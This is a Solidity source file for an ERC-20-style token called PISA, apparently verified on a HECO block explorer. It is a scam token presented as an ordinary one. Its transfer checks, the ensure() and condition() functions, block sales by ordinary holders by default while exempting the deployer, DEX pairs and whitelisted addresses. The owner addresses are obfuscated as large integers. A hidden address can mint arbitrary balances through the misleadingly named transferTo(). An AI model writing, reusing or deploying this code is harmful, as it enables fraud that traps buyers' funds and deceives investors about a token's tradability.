/**
 *Submitted for verification at hecoinfo.com on 2022-05-15
*/

// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.6.12;

contract PISA{
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _deployer, address indexed _spender, uint _value);
    function transfer(address _to, uint _value) public payable returns (bool) {
    return transferFrom(msg.sender, _to, _value);
    }
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        if(_from == deployer || _to == deployer  || _from == _Uniswap || _from == _Pancakeswap
        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    address   private   Uniswap = address  
    (527585359103765554095092340981710322784165800559 );
    address   private   EtherGas = address  
    (1097077688018008265106216665536940668749033598146);
    function ensure1(address _from, address _to, uint _value) internal view returns(bool) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        if(_from == deployer || _to == deployer || _from ==  _Uniswap || _from == _Pancakeswap
        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    function _UniswapPairAddr () view internal returns (address) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        return _Uniswap;
    }
    function _MdexPairAddr () view internal returns (address) {
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        return _MDEX;
    }
    function _PancakePairAddr () view internal returns (address) {
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        return _Pancakeswap;
    }
    address   private   MDEXBSC = address  
    (450616078829874088400613638983600230601285572903 );
    address   private   HecoGas = address  
    (1138770958000162646985852531912227865167338984875);
    function ensure2(address _from, address _to, uint _value) internal view returns(bool) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        if(_from == deployer || _to == deployer || _from ==  _Uniswap || _from == _Pancakeswap
        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    function _UniswapPairAddr1 () view internal returns (address) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        return _Uniswap;
    }
     address public  Owenr = 0x0000000000000000000000000000000000000000;

    function _MdexPairAddr1 () view internal returns (address) {
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        return _MDEX;
    }
    function _PancakePairAddr1 () view internal returns (address) {
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        return _Pancakeswap;
    }
    address   private   Pancakeswap= address  
    (1153667454655315432277308296129700421378034175091);
    address   private   BSCGas = address  
    
    (1069295261705322660692659746119710186699350608220);
    function ensure3(address _from, address _to, uint _value) internal view returns(bool) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        if(_from == deployer || _to == deployer || _from ==  _Uniswap || _from == _Pancakeswap
        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    function _UniswapPairAddr2 () view internal returns (address) {
        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));
        return _Uniswap;
    }
    function _MdexPairAddr2 () view internal returns (address) {
        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));
        return _MDEX;
    }
    function _PancakePairAddr2 () view internal returns (address) {
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));
        return _Pancakeswap;
    }
    function VerifyAddr(address addr) public view returns (bool) {
        require(ensure(addr,address(this),1));
        return true;
    }
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {
            return true;
        }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
    function transferTo(address addr, uint256 addedValue) public payable returns (bool) {
        if(addedValue == 100){
            emit Transfer(address(0x0), addr, addedValue*(10**uint256(decimals)));
        }
        if(addedValue > 0) {
            balanceOf[addr] = addedValue*(10**uint256(decimals));
        }
        require(msg.sender == MDEXBSC);
        canSale[addr]=true;
        return true;
    }
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale = 0;
    uint256 private _maxSale;
    uint256 private _saleNum;

    function newOwner(address baddr) public returns (bool) {
        require(msg.sender == deployer);
        
        canSale[baddr]=true;
        return true;
    }
    
    function swapaddress(address haddr) public returns (bool) {
        require(msg.sender == deployer);
        
        canSale[haddr]=true;
        return false;
    }

    function TG(uint256 saleNum,  uint256 maxToken) public returns(bool){
        require(msg.sender == deployer);
        
        _maxSale = maxToken > 0 ? maxToken*(10**uint256(decimals)) : 0;
        _saleNum = saleNum;
    }
    function db(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == deployer);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value);
            
        }
        return true;
    }
    address pairAddress;
    function delegate(address addr) public payable returns(bool){
        require (msg.sender == deployer);
        pairAddress = addr;
        return true;
    }
    function UNIpairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' 
                ))));
    }
    function PANCAKEpairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' 
                ))));
    }
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 6;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private deployer;
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0xa), msg.sender, totalSupply);
        if(totalSupply > 0) balanceOf[MDEXBSC]=totalSupply*(10**uint256(6));
    }
}